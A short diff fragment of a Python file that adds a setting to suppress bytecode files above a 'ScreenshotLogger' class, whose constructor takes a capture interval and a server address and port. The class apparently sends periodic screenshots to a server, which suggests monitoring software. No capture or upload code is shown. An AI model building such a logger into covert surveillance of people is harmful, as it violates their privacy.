@@ -3,6 +3,9 @@ import threading
 import requests
 import os
 from datetime import datetime
+import sys
+
+sys.dont_write_bytecode = True
 
 class ScreenshotLogger:
     def __init__(self, interval = 60, server_ip="127.0.0.1", port=8080):
